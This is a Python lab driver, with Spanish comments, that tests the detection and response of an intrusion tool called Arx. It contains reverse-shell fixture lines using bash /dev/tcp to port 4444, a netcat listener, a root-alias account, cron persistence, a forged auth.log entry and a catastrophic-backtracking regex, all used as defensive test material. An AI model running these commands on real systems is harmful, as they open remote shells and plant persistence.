#!/usr/bin/env python3
"""Driver del mini-lab Arx — corre DENTRO del contenedor víctima.

Modos (los orquesta lab/docker-lab.sh con un contenedor atacante separado):
  prep              learn ×2 + seal + canario + listeners señuelo 9001-9012
  net-scan <ip>     L1: verifica detección del escaneo y bloqueo nft de la IP
  release           libera los bloqueos Tier 1 (entre fases de red)
  net-brute <ip>    L2: verifica detección de fuerza bruta y bloqueo nft
  net-revsh <ip>    L6: detección + canal bloqueado + SOLO el dueño suspendido
  net-revsh-verify <ip>  L6: el canal sigue muerto sin suspensión y la reversión lo revive
  net-tarpit <ip>   Tarpit (Core): estrangula la IP del escaneo en vez de bloquearla
  sandbox           F6 estático: distingue un fichero malicioso de uno benigno (sin ejecutar)
  forensics         F16: informe forense sellado de los incidentes + detección de manipulación
  hostile           ficheros-trampa contra el bucle de guardia: no debe colgarse ni morir
  identity          bloqueo de cuenta real: sesiones cerradas, llave fuera, solo `unlock` la abre
  identity-llm <ip> veredicto del modelo sobre un acceso real sin terminal desde el atacante
  operator <ip> <si|no>  ¿esa IP se considera un operador intocable?
  identity-forged   una línea falsa en auth.log no debe bloquear a nadie
  identity-unlock   levanta el bloqueo de bob (lo decide una persona)
  uid0              alias de root: alerta crítica; bloquearlo no afecta a root
  proposal-apply    aplica el cierre de contraseñas de SSH propuesto por Arx
  proposal-revert   lo deshace
  vaccine-sign      firma un paquete de prueba, otro alterado y otro de otra clave
  vaccine-apply <pub> <valid|insufficient>  validación en ESTE host, descargando de otra máquina
  vaccine-intel     una IP de vacuna conectada: se detecta y se bloquea
  forward-up        un "contenedor" con un servicio publicado por DNAT
  forward-block <ip> bloquea esa IP; el efecto se mide desde el atacante
  levels            L4, L5, L7, L8, L9 en la víctima + scoreboard
  all               prep + levels (modo clásico de contenedor único)

Cada modo imprime [PASS]/[FAIL] por nivel y sale != 0 si falla.
"""
import json
import os
import signal
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/src/src")
os.environ["PYTHONPATH"] = "/src/src"  # los subprocesos `arx ...` heredan esto
os.environ.setdefault("ARX_CONFIG_DIR", "/work/labcfg")
os.environ.setdefault("ARX_STATE_DIR", "/work/labstate")

from arx import config  # noqa: E402

score = []


def report(level, ok, evidence):
    score.append(ok)
    print(f"[{'PASS' if ok else 'FAIL'}] nivel {level}: {evidence}")
    if not ok:  # un FAIL debe explicarse solo: así se distinguió B9 de un problema de reloj
        print(f"  acciones Tier 1 en la última hora: "
              f"{len(config.read_json(config.state_dir() / 'tier1_actions.json', []))}")
        for i in incidents()[-6:]:
            print(f"  · {(i.get('detail') or '')[:70]} => {(i.get('status') or '')[:70]}")


def sh(cmd, **kw):
    return subprocess.run(cmd, shell=isinstance(cmd, str),
                          capture_output=True, text=True, **kw)


def arx(*args):
    r = sh([sys.executable, "-m", "arx.cli", *args])
    return (r.stdout or "") + (r.stderr or "")


def incidents():
    try:
        lines = (config.state_dir() / "incidents.jsonl").read_text().splitlines()
    except OSError:
        return []
    out = []
    for line in lines:
        try:
            out.append(json.loads(line))
        except ValueError:
            pass
    return out


def sweep():
    return arx("guard", "--once", "--enforce")


def _nft_set(name):
    return sh(["nft", "list", "set", "inet", "arx", name]).stdout


def prep():
    config.write_json(config.config_dir() / "config.json",
                      {"llm_daily_budget": 0, "lab": True})
    print("── preparación: verificar listeners 9001-9012 + learn ×2 + seal + canario ──")
    # Los listeners se siembran en el entrypoint del contenedor (docker exec mata el
    # árbol de procesos al salir — B7). Aquí se VERIFICA, con honestidad si faltan.
    dead = [p for p in range(9001, 9013)
            if socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex(("127.0.0.1", p)) != 0]
    if dead:
        print(f"listeners señuelo caídos: {dead} — deben nacer en el entrypoint")
        return 1
    arx("learn")
    arx("learn")
    out = arx("learn", "--seal")
    assert "sellad" in out.lower() or "seal" in out.lower(), f"seal falló: {out}"
    print(arx("canaries", "plant").strip()[:120])
    return 0


def net_scan(ip):
    sweep()
    found = any("scan from" in i.get("detail", "") and ip in i.get("detail", "")
                for i in incidents())
    blocked = ip in _nft_set("block_ipv4")
    ok = found and blocked
    print(f"[{'PASS' if ok else 'FAIL'}] nivel 1: escaneo detectado={found} · "
          f"IP en block_ipv4={blocked}")
    return 0 if ok else 1


def release():
    """Libera los bloqueos Tier 1 activos (como si hubieran expirado) entre fases."""
    from datetime import datetime, timedelta, timezone
    from arx.modules import response
    later = datetime.now(timezone.utc) + timedelta(minutes=61)
    n = len(response.expire_blocks(now=later))
    print(f"── bloqueos Tier 1 liberados entre fases: {n} ──")
    return 0


def net_brute(ip):
    sweep()
    found = any("authentication failures from" in i.get("detail", "")
                and ip in i.get("detail", "") for i in incidents())
    blocked = ip in _nft_set("block_ipv4")
    ok = found and blocked
    print(f"[{'PASS' if ok else 'FAIL'}] nivel 2: fuerza bruta detectada={found} · "
          f"IP en block_ipv4={blocked}")
    return 0 if ok else 1


C2_PORT = 4444


def _c2_conns(ip):
    from arx.modules import recon
    return [c for c in recon.connection_owners()
            if c.get("remote_ip") == ip and c.get("remote_port") == C2_PORT
            and c.get("state") == "ESTABLISHED"]


def _proc_state(pid):
    return sh(["ps", "-o", "stat=", "-p", str(pid)]).stdout.strip()


def _wait_file(path, seconds):
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        if os.path.exists(path):
            return True
        time.sleep(0.25)
    return os.path.exists(path)


def net_revsh(ip):
    """L6, fase 1: `bash -i >& /dev/tcp/<atacante>/4444` lanzado por docker-lab.sh.

    Pasa si la orden previa del atacante se ejecutó (el shell es real), Arx lo detecta,
    el canal queda en c2_out4, el dueño queda suspendido y otro bash del host NO (B9).
    """
    owner = None
    for _ in range(40):  # esperar a que el socket C2 se establezca (≤10 s)
        owner = next((c["pid"] for c in _c2_conns(ip) if c.get("pid")), None)
        if owner:
            break
        time.sleep(0.25)
    if not owner:
        report(6, False, "el reverse shell no llegó a establecer el canal C2")
        return 1
    executed = _wait_file("/tmp/c2-antes", 5)
    bystander = subprocess.Popen(["bash", "-c", "while :; do sleep 1; done"])
    time.sleep(0.5)
    sweep()
    # el incidente se registra con kind="incident"; el tipo del hallazgo va en el detalle
    detected = any("outbound connection" in i.get("detail", "") and ip in i.get("detail", "")
                   for i in incidents())
    blocked = f"{ip} . {C2_PORT}" in _nft_set("c2_out4")
    suspended = _proc_state(owner).startswith("T")
    bystander_ok = not _proc_state(bystander.pid).startswith("T")
    bystander.kill()
    report(6, executed and detected and blocked and suspended and bystander_ok,
           f"orden previa ejecutada={executed} · detectado={detected} · "
           f"canal bloqueado={blocked} · dueño suspendido={suspended} · "
           f"otro bash intacto={bystander_ok}")
    return 0 if all(score) else 1


def net_revsh_verify(ip):
    """L6, fase 2: el corte es real por sí solo y la reversión lo deshace de verdad.

    Se descongela el shell para probar el canal sin la ayuda de la suspensión: la orden
    enviada tras el bloqueo no debe llegar ni debe poder reconectar. Al expirar, la orden
    retenida debe llegar por retransmisión TCP: esa es la prueba de que es reversible.
    """
    pids = [c["pid"] for c in _c2_conns(ip) if c.get("pid")]
    for pid in pids:
        os.kill(pid, signal.SIGCONT)
    time.sleep(4)
    leaked = os.path.exists("/tmp/c2-despues")
    reconnect = sh(["timeout", "3", "bash", "-c",
                    f"exec 3<>/dev/tcp/{ip}/{C2_PORT}"]).returncode == 0
    release()
    unblocked = f"{ip} . {C2_PORT}" not in _nft_set("c2_out4")
    resumed = _wait_file("/tmp/c2-despues", 30)
    for pid in pids:  # limpieza: el shell del lab no debe seguir vivo en los niveles siguientes
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass
    report(6, bool(pids) and not leaked and not reconnect and unblocked and resumed,
           f"orden durante el bloqueo llegó={leaked} · reconexión posible={reconnect} · "
           f"bloqueo retirado al expirar={unblocked} · orden retenida llegó tras revertir={resumed}")
    return 0 if all(score) else 1


def net_tarpit(ip):
    """Tarpit (Core): con política ip_response='tarpit', Arx ESTRANGULA la IP del escaneo
    (rate-limit per-IP en nftables) en vez de bloquearla. Pizarra limpia: el tarpit es un
    PRIMER contacto, no una reaparición tras bloqueo. Reutiliza el escaneo real del L1.
    """
    _slate(keep_scan=True)  # la pista la acaba de llenar el escaneo: es lo que se va a medir
    cfg = config.load_config()
    cfg["ip_response"] = "tarpit"       # política Core: estrangular, no bloquear
    config.save_config(cfg)
    sweep()
    tarpitted = ip in _nft_set("tarpit4")
    not_blocked = ip not in _nft_set("block_ipv4")
    throttled = "@tarpit4" in sh(["nft", "list", "chain", "inet", "arx", "input"]).stdout
    ok = tarpitted and not_blocked and throttled
    print(f"[{'PASS' if ok else 'FAIL'}] tarpit (Core): estrangulada en tarpit4={tarpitted} · "
          f"NO bloqueada={not_blocked} · reglas rate-limit per-IP activas={throttled}")
    cfg["ip_response"] = "block"        # restaurar el modo por defecto
    config.save_config(cfg)
    return 0 if ok else 1  # docker-lab.sh mide el efecto desde el atacante y luego libera


def _slate(keep_scan=False):
    """Pizarra limpia entre escenarios independientes: el freno no debe mezclarlos."""
    from arx.modules import response
    for path in (response._findings_path(), response._blocks_path(), response._actions_path(),
                 response._llm_locks_path()):
        config.write_json(path, {} if "findings" in path.name else [])
    # el estado y el kernel van juntos: si no, una IP sigue bloqueada sin que Arx lo sepa
    for name in ("block_ipv4", "tarpit4", "c2_out4") + (() if keep_scan else ("scan4",)):
        sh(["nft", "flush", "set", "inet", "arx", name])


def hostile():
    """El bucle de guardia lee datos que controla el atacante. Cada trampa colgaba o tumbaba
    a Arx: el barrido debe terminar y el dropper real quedar suspendido."""
    tail = b"nc -" + b"e" * (3 * 1024 * 1024)
    ok_all = True

    def trap(name, path, prepare=None, after=None):
        nonlocal ok_all
        _slate()
        sh(["cp", "/usr/bin/yes", path])
        if prepare:
            prepare(path)
        proc = subprocess.Popen([path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        if after:
            after(path)
        try:
            r = sh([sys.executable, "-m", "arx.cli", "guard", "--once", "--enforce"], timeout=45)
            finished, rc = True, r.returncode
        except subprocess.TimeoutExpired:
            finished, rc = False, None
        state = _proc_state(proc.pid)
        ok = finished and rc == 0 and state.startswith("T")
        ok_all = ok_all and ok
        print(f"[{'PASS' if ok else 'FAIL'}] trampa {name}: barrido terminó={finished} · rc={rc} · "
              f"dropper en estado {state}")
        proc.kill()

    trap("regex (cola de 3 MiB)", "/tmp/t-regex", lambda p: open(p, "ab").write(tail))
    trap("FIFO en la ruta", "/tmp/t-fifo",
         after=lambda p: (os.unlink(p), os.mkfifo(p)))
    trap("se borra a sí mismo", "/tmp/t-borra", after=os.unlink)
    trap("nombre no UTF-8", os.fsdecode(b"/tmp/t-\xff\xfe"))
    trap("salto de línea en el nombre", "/tmp/t-\n  [info] todo en orden")
    _slate()
    return 0 if ok_all else 1


def _alive_of(user):
    """Procesos vivos de una cuenta. En el contenedor nadie recoge a los zombis: no cuentan."""
    rows = sh(["ps", "-u", user, "-o", "pid=,stat="]).stdout.splitlines()
    return [r.split()[0] for r in rows if not r.split()[1].startswith("Z")]


def identity():
    """Bloqueo de cuenta REAL con sshd: lo que importa es si el acceso entra o no, si lo que
    dejó corriendo muere y si el reloj la desbloquea (no debe)."""
    import pwd
    from datetime import datetime, timedelta, timezone
    from arx.modules import response
    _slate()
    sh("id bob >/dev/null 2>&1 || useradd -m -s /bin/bash bob; "
       "ssh-keygen -q -t ed25519 -N '' -f /tmp/bobkey -C lab <<<y >/dev/null 2>&1; "
       "mkdir -p /home/bob/.ssh; cp /tmp/bobkey.pub /home/bob/.ssh/authorized_keys; "
       "chown -R bob: /home/bob/.ssh; chmod 700 /home/bob/.ssh; echo bob:clave-bob | chpasswd",
       executable="/bin/bash")
    ssh = ["ssh", "-i", "/tmp/bobkey", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes",
           "-o", "ConnectTimeout=5", "bob@127.0.0.1"]

    def key_enters():
        return sh([*ssh, "true"]).returncode == 0
    before = key_enters()
    # lo que un intruso dejaría: sesión sin terminal, con terminal, un proceso desligado y un
    # proceso de root nacido de su sesión (lo que deja un `sudo -i`: uid 0, loginuid suyo)
    plain = subprocess.Popen([*ssh, "sleep 600"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    tty = subprocess.Popen([*ssh[:-1], "-tt", "bob@127.0.0.1", "sleep 600"], stdin=subprocess.PIPE,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    sh([*ssh, "nohup sleep 900 >/dev/null 2>&1 &"])
    uid = pwd.getpwnam("bob").pw_uid
    root_child = subprocess.Popen(["sh", "-c", f"echo {uid} > /proc/self/loginuid; exec sleep 900"])
    time.sleep(1.5)
    bob_procs = _alive_of("bob")
    rep = response.contain_identity(
        {"kind": "login_users", "sev": "high", "detail": "nuevo en login_users: bob@127.0.0.1",
         "set": "login_users", "item": "bob@127.0.0.1", "target": {"user": "bob@127.0.0.1"}}, "lab")
    locked = rep["locked"] and not key_enters()
    try:
        plain.wait(10), tty.wait(10), root_child.wait(10)
    except subprocess.TimeoutExpired:
        pass
    sessions_dead = plain.poll() is not None and tty.poll() is not None
    root_dead = root_child.poll() is not None
    left = _alive_of("bob")
    print(f"  procesos de bob antes: {len(bob_procs)} · cerrados según Arx: {len(rep['closed'])} · "
          f"después: {len(left)}")
    # el reloj nunca desbloquea
    later = datetime.now(timezone.utc) + timedelta(days=30)
    response.expire_blocks(now=later)
    still_locked = not key_enters()
    in_list = [a["user"] for a in response.locked_accounts()] == ["bob"]
    done = response.unlock_account("bob")
    restored = key_enters()
    # una cuenta que el admin ya tenía bloqueada debe seguir bloqueada al desbloquear
    sh("id carol >/dev/null 2>&1 || useradd -m carol; echo carol:x | chpasswd; usermod -L carol")
    response._lock_account("carol", {"kind": "login_users", "detail": "lab carol"})
    response.unlock_account("carol")
    admin_lock = sh(["passwd", "-S", "carol"]).stdout.split()[1] == "L"
    ok = (before and bob_procs and locked and sessions_dead and root_dead and not left and still_locked
          and in_list and restored and admin_lock)
    print(f"[{'PASS' if ok else 'FAIL'}] identidad: llave entra antes={before} · bloqueada de verdad={locked} · "
          f"sesiones cerradas={sessions_dead} · nada de bob vivo={not left} · root de su sesión cerrado={root_dead} · "
          f"sigue bloqueada al mes={still_locked} · unlock={restored} ({done}) · "
          f"bloqueo previo del admin respetado={admin_lock}")
    _slate()
    return 0 if ok else 1


def _lab_answer(fp, verdict="threat", confidence=92):
    return ("Unknown access in a live session.\nVERDICTS: "
            + json.dumps([{"id": fp, "verdict": verdict, "confidence": confidence, "reason": "lab"}]))


def identity_llm(ip):
    """Veredicto del modelo de punta a punta. El modelo se sustituye por su respuesta: lo que se
    prueba es qué hace Arx con ella. El acceso (sin terminal) y la línea falsa son reales."""
    from arx.modules import baseline, guard, response
    _slate()
    base = baseline.load()
    cfg = {"lab": True}
    findings, outcomes = guard.sweep(base, enforce=True, include_suid=False, cfg=cfg)
    pairs = list(zip(findings, outcomes))
    real = next((p for p in pairs if p[0].get("item") == f"bob@{ip}"), None)
    if real is None:
        print(f"[FAIL] identidad+modelo: un acceso sin terminal de bob@{ip} no se detectó")
        return 1
    print(f"  hechos que recibe el modelo: {guard.build_dossier([real], base)['new_findings'][0]['facts']}")
    guard._assess_with_engine = lambda new, b, c: _lab_answer(real[1]["fp"])
    slow = guard.SlowLayer(cfg, base, enforce=True)
    slow.feed([real[0]], [real[1]])
    rep = slow.reports[0] if slow.reports else {}
    print("  " + (rep.get("summary") or "").replace("\n", "\n  "))
    locked = sh(["passwd", "-S", "bob"]).stdout.split()[1] == "L"
    ip_blocked = ip in _nft_set("block_ipv4")
    ok = bool(rep.get("locked")) and locked and ip_blocked and not _alive_of("bob")
    print(f"[{'PASS' if ok else 'FAIL'}] identidad+modelo: cuenta bloqueada={locked} · nada de bob vivo · "
          f"IP de origen bloqueada={ip_blocked}")
    return 0 if ok else 1


def operator(ip, expected):
    """¿Esta IP se considera un operador intocable? Se decide varias veces: la protección pide persistir."""
    from arx.modules import response
    config.write_json(config.state_dir() / "ssh-peers.json", {})
    seen = [ip in response._never_block_ips() for _ in range(3)]
    ok = seen[-1] == (expected == "si")
    what = "una sesión autenticada sí protege" if expected == "si" else "una conexión sin autenticar no protege"
    print(f"[{'PASS' if ok else 'FAIL'}] {what}: intocable={seen[-1]}")
    return 0 if ok else 1


def identity_forged():
    """Un usuario sin privilegios escribe en auth.log: el veredicto no debe tocar a la víctima."""
    from arx.modules import baseline, guard, response
    _slate()
    base = baseline.load()
    sh("id dana >/dev/null 2>&1 || useradd -m dana; echo dana:x | chpasswd")
    guard.sweep(base, enforce=True, include_suid=False, cfg={})  # pone al día el cursor de auth.log
    sh(["su", "nobody", "-s", "/bin/sh", "-c",
        "logger -p auth.info -t 'sshd[1]' 'Accepted password for dana from 198.51.100.7 port 1 ssh2'"])
    time.sleep(1)
    findings, outcomes = guard.sweep(base, enforce=True, include_suid=False, cfg={})
    forged = next((p for p in zip(findings, outcomes) if p[0].get("item") == "dana@198.51.100.7"), None)
    if forged is None:
        print("[FAIL] línea falsa: logger no llegó a auth.log; la prueba no prueba nada")
        return 1
    guard._assess_with_engine = lambda new, b, c: _lab_answer(forged[1]["fp"])
    slow = guard.SlowLayer({}, base, enforce=True)
    slow.feed([forged[0]], [forged[1]])
    untouched = sh(["passwd", "-S", "dana"]).stdout.split()[1] == "P"
    said = "forged" in (slow.reports[0]["summary"] if slow.reports else "")
    ok = untouched and said
    print(f"[{'PASS' if ok else 'FAIL'}] línea falsificada con logger: dana intacta={untouched} · el dueño lo sabe={said}")
    return 0 if ok else 1


def identity_unlock():
    from arx.modules import response
    done = response.unlock_account("bob")
    print(f"── bob desbloqueado: {done} ──")
    return 0 if done and not response.revert_failed(done) else 1


def uid0():
    """Un alias de root: alerta crítica, y bloquearlo no debe afectar a root."""
    from arx.modules import baseline, guard, response
    _slate()
    sh("useradd -o -u 0 -M -s /bin/bash toor; echo toor:x | chpasswd")
    base = baseline.load()
    findings, outcomes = guard.sweep(base, enforce=True, include_suid=False, cfg={})
    pair = next((p for p in zip(findings, outcomes) if p[0].get("kind") == "uid0_account"), None)
    if pair is None:
        print("[FAIL] alias de root: no se detectó")
        sh("sed -i '/^toor:/d' /etc/passwd /etc/shadow")
        return 1
    crit, tier2 = pair[0]["sev"] == "crit", pair[1]["tier"] == 2
    item = response.authorize_pending(pair[1]["pending_id"])
    alias_locked = sh(["passwd", "-S", "toor"]).stdout.split()[1] == "L"
    root_ok = sh(["passwd", "-S", "root"]).stdout.split()[1] == "P"
    arx_alive = os.getuid() == 0 and sh(["id", "-u"]).stdout.strip() == "0"
    ok = crit and tier2 and alias_locked and root_ok and arx_alive
    print(f"[{'PASS' if ok else 'FAIL'}] alias de root: crítico={crit} · espera al humano={tier2} · "
          f"alias bloqueado={alias_locked} · root intacto={root_ok} · {item['executed'][:60]}…")
    sh("sed -i '/^toor:/d' /etc/passwd /etc/shadow")
    _slate()
    return 0 if ok else 1


def forward_up():
    """Un "contenedor": otra red con un servicio publicado por DNAT, como hace Docker."""
    sh("""ip netns add c1
ip link add veth0 type veth peer name veth1
ip link set veth1 netns c1
ip addr add 10.99.0.1/24 dev veth0
ip link set veth0 up
ip netns exec c1 ip addr add 10.99.0.2/24 dev veth1
ip netns exec c1 ip link set veth1 up
ip netns exec c1 ip link set lo up
ip netns exec c1 ip route add default via 10.99.0.1
sysctl -q net.ipv4.ip_forward=1
nft add table ip natlab
nft 'add chain ip natlab pre { type nat hook prerouting priority -100; }'
nft add rule ip natlab pre tcp dport 8088 dnat to 10.99.0.2:8088
nohup ip netns exec c1 nc -k -l 8088 >/dev/null 2>&1 &
""")
    time.sleep(1)
    return 0


def forward_block(ip):
    from arx.modules import response
    _slate()
    status, revert = response._execute_tier1(
        {"kind": "auth_bruteforce", "sev": "high", "detail": f"lab forward {ip}", "target": {"ip": ip}}, {})
    print(f"  {status}")
    print("  " + sh(["nft", "list", "chain", "inet", "arx", "forward"]).stdout.replace("\n", "\n  "))
    return 0 if revert else 1


def proposal_apply():
    from arx.modules import proposals
    _slate()
    sh("mkdir -p /root/.ssh; cat /tmp/bobkey.pub >> /root/.ssh/authorized_keys; chmod 700 /root/.ssh")
    sh("grep -q sshd_config.d /etc/ssh/sshd_config || sed -i '1i Include /etc/ssh/sshd_config.d/*.conf' /etc/ssh/sshd_config")
    sh("sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config; pkill -HUP -x sshd || true")
    offered = [p["id"] for p in proposals.all_proposals()]
    msg = proposals.apply_ssh("ssh-no-password")
    time.sleep(1)
    key = sh(["ssh", "-i", "/tmp/bobkey", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes",
              "-o", "ConnectTimeout=5", "bob@127.0.0.1", "true"]).returncode == 0
    ok = "ssh-no-password" in offered and msg.startswith("done") and key
    print(f"[{'PASS' if ok else 'FAIL'}] propuesta: ofrecida={'ssh-no-password' in offered} · {msg[:60]}… · la llave sigue entrando={key}")
    return 0 if ok else 1


def proposal_revert():
    from arx.modules import proposals
    msg = proposals.revert_ssh("ssh-no-password")
    time.sleep(1)
    print(f"── {msg} ──")
    return 0 if msg.startswith("undone") else 1


def _lab_feed(serial=1, revoked=()):
    return {"serial": serial, "issued": "2026-11-05T00:00:00+00:00", "revoked": list(revoked), "vaccines": [
        {"id": "lab-ip", "version": 1, "description": "IP de prueba del lab", "iocs": {"ips": ["185.220.101.50"]}},
        {"id": "lab-regla", "version": 1, "description": "minero de prueba", "iocs": {},
         "rules": [{"id": "minero", "verdict": "malicious", "regex": "lab-minero-[a-z]{1,8}",
                    "must_match": ["corre lab-minero-abc"], "must_not_match": ["un texto normal"]}]},
        {"id": "lab-hostil-red", "version": 1, "description": "bloquea todo", "iocs": {"ips": ["10.0.0.0/8"]}},
        {"id": "lab-hostil-regex", "version": 1, "description": "cuelga el bucle", "iocs": {},
         "rules": [{"id": "x", "verdict": "malicious", "regex": "(a+)+$", "must_match": ["aaa"],
                    "must_not_match": ["b"]}]},
    ]}


def _tool():
    import importlib.util
    spec = importlib.util.spec_from_file_location("vaccine_tool", "/src/scripts/vaccine_tool.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def vaccine_sign():
    """Clave de usar y tirar: esto prueba el protocolo, no es la clave de ASL."""
    import base64
    import secrets
    tool = _tool()
    secret = secrets.token_bytes(32)
    signed = tool.signed_feed(_lab_feed(), secret)
    json.dump(signed, open("/work/feed.signed.json", "w"))
    evil = base64.b64decode(signed["payload"]).replace(b"185.220.101.50", b"185.220.101.66")
    json.dump({"payload": base64.b64encode(evil).decode(), "sig": signed["sig"]}, open("/work/feed.tampered.json", "w"))
    json.dump(tool.signed_feed(_lab_feed(), secrets.token_bytes(32)), open("/work/feed.other-key.json", "w"))
    open("/work/feed.pub", "w").write(tool.public_key(secret).hex())
    return 0


def vaccine_apply(pub, rule_expected):
    """En cada host: lo alterado y lo de otra clave no se abre; lo hostil no se aplica aunque esté
    firmado; y la regla vale o no según lo que haya en ESTE host."""
    from arx.modules import vaccines
    url = "http://attacker:8000/"
    tampered = vaccines.update(pubkey=pub, cfg={"vaccine_feed_url": url + "feed.tampered.json"})
    other = vaccines.update(pubkey=pub, cfg={"vaccine_feed_url": url + "feed.other-key.json"})
    refused = "signature" in str(tampered.get("reason")) and "signature" in str(other.get("reason"))
    untouched = not vaccines._load().get("applied")
    out = vaccines.update(pubkey=pub, cfg={"vaccine_feed_url": url + "feed.signed.json"})
    if not out.get("ok"):
        print(f"[FAIL] vacunas: no se pudo aplicar ({out.get('reason')})")
        return 1
    for r in out["rejected"]:
        print(f"  ✗ {r['id']}: {r['status']} — {r['reason']}")
    status = {r["id"]: r["status"] for r in out["rejected"]}
    hostile = status.get("lab-hostil-red") == "hostile" and status.get("lab-hostil-regex") == "hostile"
    rule_ok = ("lab-regla" in out["applied"]) if rule_expected == "valid" else status.get("lab-regla") == rule_expected
    ip_ok = "lab-ip" in out["applied"]
    # repetir un paquete antiguo no debe colar
    fired = False
    if rule_expected == "valid":
        sample = "/work/muestra-vacuna"
        open(sample, "w").write("#!/bin/sh\n# corre lab-minero-abc\n")
        fired = "MALICIOUS" in arx("scan", sample)
        os.unlink(sample)
    ok = refused and untouched and hostile and rule_ok and ip_ok and (fired or rule_expected != "valid")
    print(f"[{'PASS' if ok else 'FAIL'}] vacunas en este host: alterado y otra clave rechazados={refused} · "
          f"nada aplicado antes de la firma buena={untouched} · hostiles rechazadas={hostile} · "
          f"regla {rule_expected}={rule_ok} · IP aplicada={ip_ok}"
          + (f" · arx scan la usa={fired}" if rule_expected == "valid" else ""))
    return 0 if ok else 1


def vaccine_intel():
    from arx.modules import baseline, guard
    _slate()
    findings, outcomes = guard.sweep(baseline.load(), enforce=True, include_suid=False, cfg={})
    pair = next((p for p in zip(findings, outcomes) if p[0].get("kind") == "intel_ip"), None)
    blocked = "185.220.101.50" in _nft_set("block_ipv4")
    ok = pair is not None and blocked
    print(f"[{'PASS' if ok else 'FAIL'}] vacuna con IP: conexión viva detectada={pair is not None} · bloqueada={blocked}"
          + (f" · {pair[1]['status'][:70]}" if pair else ""))
    return 0 if ok else 1


def sandbox_scan():
    """F6 (Core): el analizador estático distingue un fichero MALICIOSO de uno benigno
    SIN ejecutar nada. El fixture malicioso es una línea de reverse shell INERTE (jamás
    se corre: solo se lee); el benigno es el dropper del L5 (una copia de `yes`).
    """
    mal = "/work/scan-fixture-malicioso"  # inerte: NUNCA se ejecuta, solo se analiza
    with open(mal, "w") as f:
        f.write("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.3/4444 0>&1\n")
    mal_ok = "MALICIOUS" in arx("scan", mal)
    benign = "/tmp/miner" if os.path.exists("/tmp/miner") else "/bin/true"
    benign_ok = "MALICIOUS" not in arx("scan", benign)
    os.unlink(mal)
    ok = mal_ok and benign_ok
    print(f"[{'PASS' if ok else 'FAIL'}] sandbox estático: fixture malicioso detectado={mal_ok} · "
          f"binario benigno NO marcado malicioso={benign_ok}")
    return 0 if ok else 1


def forensics_report():
    """F16: tras los ataques del lab, Arx arma un informe forense SELLADO (cadena de hash
    + HMAC) sobre los incidentes REALES acumulados, lo verifica, y una manipulación
    posterior de la cronología rompe el sellado."""
    from arx.modules import forensics
    rep = forensics.build_report()
    n = len(rep["timeline"])
    ok_intact, _ = forensics.verify(rep)
    tampered = json.loads(json.dumps(rep))
    broke = True
    if tampered["timeline"]:
        tampered["timeline"][0]["detail"] = "borrado por el intruso"
        valid, _ = forensics.verify(tampered)
        broke = not valid
    ok = n > 0 and ok_intact and broke
    print(f"[{'PASS' if ok else 'FAIL'}] F16 forense: {n} eventos en la cronología · "
          f"sellado válido={ok_intact} · manipulación detectada={broke}")
    return 0 if ok else 1


def levels():
    canary_path = None
    from arx.modules import canaries
    planted = canaries._load().get("canaries", [])
    if planted:
        canary_path = planted[0]["path"]

    print("\n── nivel 4: listener nuevo (4444) ──")
    sh("nohup nc -l 4444 >/dev/null 2>&1 &")
    time.sleep(1)
    sweep()
    nft = sh(["nft", "list", "set", "inet", "arx", "block_tcp"]).stdout
    ok = any("listen_ports" in i.get("detail", "") and "4444" in i.get("detail", "")
             for i in incidents()) and "4444" in nft
    report(4, ok, f"puerto detectado y bloqueado en nft: {'4444' in nft}")

    print("\n── nivel 5: dropper en /tmp ejecutado ──")
    sh("cp /usr/bin/yes /tmp/miner && chmod +x /tmp/miner")
    proc = subprocess.Popen(["/tmp/miner"], stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
    time.sleep(1)
    sweep()
    time.sleep(1)
    try:
        st = sh(["ps", "-o", "stat=", "-p", str(proc.pid)]).stdout.strip()
    except Exception:
        st = "?"
    ok = st.startswith("T")
    report(5, ok, f"/tmp/miner suspendido (estado {st})")

    print("\n── nivel 7: binario SUID nuevo ──")
    sh("cp /usr/bin/id /tmp/sux && chmod u+s /tmp/sux")
    sweep()
    ok = any("suid" in i.get("detail", "").lower() and i.get("sev") in ("crit", "high")
             for i in incidents())
    report(7, ok, "integridad SUID disparó crit")

    print("\n── nivel 8: persistencia en cron.d → autorización → restauración ──")
    sh("echo '* * * * * root /bin/true' > /etc/cron.d/arxevil")
    sweep()
    pend = config.read_json(config.state_dir() / "pending_tier2.json", [])
    # el barrido puede haber encolado otros pendientes antes (p. ej. suid_set del L7):
    # el humano autoriza el de cron, no el primero de la fila
    item_id = next((p["id"] for p in pend
                    if p.get("kind") == "integrity"
                    and (p.get("target") or {}).get("file") == "cron"), None)
    restored, quarantined = False, False
    if item_id:
        from arx.modules import response
        # el humano autoriza (en la CLI real pide la palabra; aquí es el lab)
        item = response.authorize_pending(item_id)
        restored = bool(item and "restored" in (item.get("executed") or ""))
        import pathlib
        quarantined = any(p.name.startswith("q-") for p in
                          pathlib.Path(config.state_dir() / "vault").glob("q-*"))
        gone = not os.path.exists("/etc/cron.d/arxevil")
        report(8, restored and quarantined and gone,
               f"restaurado={restored} · hostil en cuarentena={quarantined} · "
               f"fichero hostil fuera de /etc/cron.d={gone}")
    else:
        report(8, False, "no se creó el pendiente Tier 2 de cron")

    print("\n── nivel 9: lectura del señuelo ──")
    if canary_path and os.path.exists(canary_path):
        sh(["cat", canary_path])
        time.sleep(1)
        sweep()
        ok = any(i.get("kind") == "canary" or "canar" in i.get("detail", "").lower()
                  for i in incidents())
        report(9, ok, "lectura del canario detectada (atime)")
    else:
        report(9, False, "no se pudo plantar el canario en el lab")

    print(f"\n══ SCOREBOARD: {sum(score)}/{len(score)} niveles superados ══")
    print("(niveles 1, 2 y 6 se validan en la fase de red: ver sus líneas arriba)")
    return 0 if all(score) else 1


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "all"
